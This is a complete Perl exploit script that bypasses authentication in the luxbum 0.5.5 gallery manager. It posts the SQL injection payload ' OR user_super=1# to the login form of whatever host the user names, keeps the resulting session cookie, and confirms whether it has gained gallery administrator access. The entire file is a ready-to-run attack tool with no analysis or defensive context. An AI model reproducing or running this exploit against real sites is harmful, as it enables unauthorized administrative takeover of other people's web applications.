#!/usr/bin/perl -w
# luxbum 0.5.5 auth bypass via sql injection.
# requires magic_quotes Off and use of dotclear auth
# returns 0 if successful, else 1
# ./luxbum http://host.tld/luxbumrootdir
# By knxone <knxone[at]webmail(d0t)ru>
use strict;
use LWP::UserAgent;
use HTTP::Cookies;
use Term::ANSIColor qw(:constants);
$Term::ANSIColor::AUTORESET = 1;
help() if ( ! defined($ARGV[0]) || scalar(@ARGV) != 1 );


my $ua = LWP::UserAgent->new(
	agent      => 'Mozilla/4.73 [en] (U; Windows 3.1; Internet Explorer 2.0)',
	cookie_jar => HTTP::Cookies->new(
		file           => ".cookies",
		autosave       => 1     	
	)
);
my $url = $ARGV[0]."/manager.php?p=login";

# First we inject to open a valid session
my $req = HTTP::Request->new( POST => $url ) ;
$req->content_type("application/x-www-form-urlencoded");
$req->content("username='+OR+user_super%3D1%23&password=".'x'x32);
my $response = $ua->request($req);
if ( ! $response->is_error && $response->content !~ m/message_ko/ ) {
	print BOLD GREEN "Auth bypass successful :-)\n";
} else {
	print BOLD RED "Auth bypass failed :-(\n";
	exit(1);
}


# Then we check if we've really done it
$response = $ua->get($ARGV[0]."/manager.php");
if ( $response->content =~ m/h1_admin/ ) {
	print BOLD GREEN "Access Granted as gallery Admin at ".$ARGV[0]." :-)))\n";
	exit(0);
} else {
	print BOLD RED "Access Denied at ".$ARGV[0]." :-(\n";
	exit(1);
}


sub help {
	print "Usage: ".$0." http://host.tld/luxbumrootdir\n";
	exit(1);
}

#EOF
